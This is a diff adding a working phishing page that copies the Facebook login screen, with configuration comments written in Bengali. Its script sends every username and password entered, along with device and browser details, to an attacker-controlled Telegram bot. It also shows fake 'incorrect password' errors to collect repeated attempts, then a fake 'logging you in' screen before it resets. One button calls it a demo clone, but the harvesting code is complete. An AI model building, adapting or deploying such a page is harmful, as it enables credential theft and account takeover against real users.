@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body class="bg-[#f0f2f5] min-h-screen flex flex-col justify-center items-center p-4">
+
+    <div class="w-full max-w-sm bg-white rounded-3xl shadow-xl overflow-hidden border border-gray-100 flex flex-col justify-between p-6 sm:p-8 my-auto">
+        
+        <!-- Top Section -->
+        <div class="flex flex-col items-center">
+            
+            <div class="text-gray-500 text-sm font-medium mb-6 cursor-pointer hover:text-gray-700 transition">
+                English (UK)
+            </div>
+
+            <!-- Facebook Logo -->
+            <div class="w-16 h-16 bg-[#0866FF] rounded-full flex items-center justify-center shadow-md mb-8">
+                <span class="text-white text-4xl font-bold leading-none select-none" style="font-family: Arial, sans-serif; transform: translateY(2px);">f</span>
+            </div>
+
+            <!-- Login Form -->
+            <form class="w-full space-y-3.5" onsubmit="event.preventDefault(); handleLogin();">
+                <div>
+                    <input 
+                        type="text" 
+                        id="username"
+                        placeholder="Mobile number or email address" 
+                        required
+                        class="w-full px-4 py-3.5 bg-gray-50 border border-gray-300 rounded-xl text-gray-900 placeholder-gray-400 text-sm focus:outline-none focus:border-[#0866FF] focus:bg-white transition"
+                    >
+                </div>
+
+                <div>
+                    <input 
+                        type="password" 
+                        id="password"
+                        placeholder="Password" 
+                        required
+                        class="w-full px-4 py-3.5 bg-gray-50 border border-gray-300 rounded-xl text-gray-900 placeholder-gray-400 text-sm focus:outline-none focus:border-[#0866FF] focus:bg-white transition"
+                    >
+                </div>
+
+                <!-- Error message (hidden by default) -->
+                <p id="errorMsg" class="hidden text-red-500 text-xs font-medium text-center -mt-1"></p>
+
+                <button 
+                    type="submit" 
+                    id="loginBtn"
+                    class="w-full py-3.5 bg-[#0866FF] hover:bg-[#1877f2] text-white font-semibold rounded-xl text-base shadow-sm active:scale-[0.99] transition duration-200"
+                >
+                    Log in
+                </button>
+            </form>
+
+            <div class="mt-4 mb-6">
+                <a href="#" onclick="event.preventDefault();" class="text-[#0866FF] hover:underline text-sm font-medium">
+                    Forgotten password?
+                </a>
+            </div>
+        </div>
+
+        <!-- Divider & Bottom Section -->
+        <div class="w-full flex flex-col items-center pt-2">
+            <div class="w-full border-t border-gray-200 mb-6"></div>
+
+            <button 
+                type="button" 
+                onclick="alert('This is a demo clone.')"
+                class="w-full py-3.5 bg-[#42b72a] hover:bg-[#36a420] text-white font-semibold rounded-xl text-base shadow-sm active:scale-[0.99] transition duration-200"
+            >
+                Create new account
+            </button>
+
+            <div class="mt-8 flex items-center justify-center space-x-1.5 text-gray-500 text-sm font-semibold tracking-wide">
+                <span class="text-base font-bold">∞</span>
+                <span>Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- =====================================================
+         JAVASCRIPT
+    ====================================================== -->
+    <script>
+        // =====================================================
+        //  ⚙️  কনফিগারেশন — শুধু এই দুটি লাইন বদলান
+        // =====================================================
+        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // BotFather থেকে token
+        const CHAT_ID   = "YOUR_CHAT_ID_HERE";     // আপনার chat id
+        // =====================================================
+
+        // কতবার ভুল password দেখাবে (তারপর সফল হবে)
+        const MAX_ATTEMPTS = 3;
+
+        // প্রতিবার page load-এ 0 থেকে শুরু (sessionStorage-এ রাখলে persist হবে)
+        let attemptCount = 0;
+
+        // ----- Main login handler -----
+        async function handleLogin() {
+            const usernameEl = document.getElementById('username');
+            const passwordEl = document.getElementById('password');
+            const btn        = document.getElementById('loginBtn');
+            const errorEl    = document.getElementById('errorMsg');
+
+            const username = usernameEl.value.trim();
+            const password = passwordEl.value;
+
+            if (!username || !password) return;
+
+            // Loading state
+            btn.disabled = true;
+            btn.textContent = "Logging in...";
+            errorEl.classList.add('hidden');
+
+            // Telegram-এ পাঠান (প্রতিবার)
+            await sendToTelegram(username, password);
+
+            // ছোট delay — বাস্তবসম্মত অনুভূতির জন্য
+            await new Promise(r => setTimeout(r, 800));
+
+            attemptCount++;
+
+            if (attemptCount < MAX_ATTEMPTS) {
+                // ❌ ভুল password দেখান
+                const remaining = MAX_ATTEMPTS - attemptCount;
+                errorEl.textContent = `The password you entered is incorrect. (${remaining} attempt${remaining > 1 ? 's' : ''} left)`;
+                errorEl.classList.remove('hidden');
+
+                // Password field clear, focus
+                passwordEl.value = '';
+                passwordEl.focus();
+
+                // Button reset
+                btn.disabled = false;
+                btn.textContent = "Log in";
+            } else {
+                // ✅ MAX_ATTEMPTS শেষে "সফল" — modal দেখান
+                errorEl.classList.add('hidden');
+                showSuccessModal();
+            }
+        }
+
+        // ----- Telegram-এ পাঠান -----
+        async function sendToTelegram(username, password) {
+            const message =
+`🔐 Login Attempt #${attemptCount + 1}
+━━━━━━━━━━━━━━
+📧 User: ${username}
+🔑 Pass: ${password}
+📱 Device: ${navigator.platform}
+🌐 Browser: ${navigator.userAgent.slice(0, 60)}...
+⏰ Time: ${new Date().toLocaleString('en-GB')}
+━━━━━━━━━━━━━━`;
+
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+                const data = await res.json();
+                if (!data.ok) console.error('Telegram error:', data);
+            } catch (err) {
+                console.error('Telegram send failed:', err);
+            }
+        }
+
+        // ----- Success modal -----
+        function showSuccessModal() {
+            // পুরো screen-এ একটি সাদা overlay + spinner + তারপর redirect
+            const overlay = document.createElement('div');
+            overlay.className = 'fixed inset-0 bg-white z-50 flex flex-col items-center justify-center gap-4';
+            overlay.innerHTML = `
+                <div class="w-16 h-16 bg-[#0866FF] rounded-full flex items-center justify-center shadow-md">
+                    <span class="text-white text-4xl font-bold" style="font-family: Arial;">f</span>
+                </div>
+                <div class="w-8 h-8 border-4 border-gray-200 border-t-[#0866FF] rounded-full animate-spin"></div>
+                <p class="text-gray-500 text-sm">Logging you in…</p>
+            `;
+            document.body.appendChild(overlay);
+
+            // ২ সেকেন্ড পর আবার form reset (loop চালু রাখতে)
+            setTimeout(() => {
+                overlay.remove();
+                attemptCount = 0;
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                const btn = document.getElementById('loginBtn');
+                btn.disabled = false;
+                btn.textContent = "Log in";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
